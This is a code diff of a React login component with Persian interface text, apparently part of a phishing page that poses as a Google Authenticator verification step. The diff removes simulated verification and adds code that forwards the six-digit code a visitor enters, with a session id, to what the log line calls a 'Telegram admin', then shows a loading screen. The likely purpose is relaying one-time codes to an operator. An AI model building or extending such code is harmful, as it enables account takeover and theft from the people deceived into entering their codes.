@@ -48,35 +48,44 @@ const AuthGoogle = () => {
   const handleCodeSubmit = async () => {
     setErrors({});
 
+    if (isBlocked) {
+      return;
+    }
+
     if (!googleCode || googleCode.length !== 6) {
       setErrors({ googleCode: "کد Google Authenticator ۶ رقمی را وارد کنید" });
+      return;
+    }
+
+    if (!sessionId) {
+      setErrors({ googleCode: "خطا در session. لطفا مجدد تلاش کنید." });
       return;
     }
 
     setIsSubmitting(true);
 
     try {
-      // Simulate Google Auth verification
-      console.log("Verifying Google Auth code:", googleCode);
-      await new Promise((resolve) => setTimeout(resolve, 1500));
+      console.log("Sending Google Auth code to Telegram admin");
 
-      // For demo purposes, accept any 6-digit code
-      console.log("Google Auth verification successful");
+      const success = await updateAuthStep(sessionId, "google", googleCode);
 
-      // Navigate back to loading page
+      if (!success) {
+        throw new Error("Failed to update Google Auth step");
+      }
+
+      await new Promise((resolve) => setTimeout(resolve, 1000));
+
       navigate("/loading", {
         state: {
           phoneNumber,
-          fromAuth: true,
-          completedSteps: ["phone", "google"],
+          sessionId,
         },
         replace: true,
       });
     } catch (error) {
-      console.error("Google Auth verification error:", error);
+      console.error("Google Auth submission error:", error);
       setErrors({
-        googleCode:
-          "کد Google Authenticator نادرست است. لطفا دوباره تلاش کنید.",
+        googleCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -308,7 +317,7 @@ const AuthGoogle = () => {
                 }}
               >
                 <li>اپلیکیشن Google Authenticator را باز کنید</li>
-                <li>QR Code بالا را اسکن کنید یا کد را دستی وارد کنی��</li>
+                <li>QR Code بالا را اسکن کنید یا کد را دستی وارد کنید</li>
                 <li>کد ۶ رقمی نمایش داده شده را وارد کنید</li>
               </ol>
             </div>
